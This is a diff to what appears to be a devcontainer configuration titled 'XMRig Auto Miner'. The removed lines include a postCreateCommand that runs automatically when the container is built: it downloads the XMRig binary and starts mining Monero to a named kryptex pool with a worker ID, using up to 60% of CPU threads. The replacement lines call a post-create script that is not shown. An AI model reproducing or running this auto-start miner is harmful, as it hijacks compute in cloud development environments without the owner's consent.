@@ -1,12 +1,7 @@
 {
     "name": "XMRig Auto Miner",
-    "dockerComposeFile": "../docker-compose.yml",
-    "service": "app",
-    "workspaceFolder": "/workspaces/${localWorkspaceFolderBasename}",
-    
- 
-    "postCreateCommand": "docker compose -f /workspaces/${localWorkspaceFolderBasename}/docker-compose.yml up -d && sleep 5 && docker exec ubuntu_miner bash -c 'apt update && apt install -y wget && cd ~ && wget https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz && tar -xzf xmrig-6.26.0-linux-static-x64.tar.gz && cd xmrig-6.26.0 && ./xmrig -o xmr-sg.kryptex.network:7029 -u krxX2P79Q4.w7uioe3 -p x --coin monero --cpu-max-threads-hint=60'",
-    
+    "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+    "postCreateCommand": "bash .devcontainer/post-create.sh",
     "customizations": {
         "vscode": {
             "extensions": []
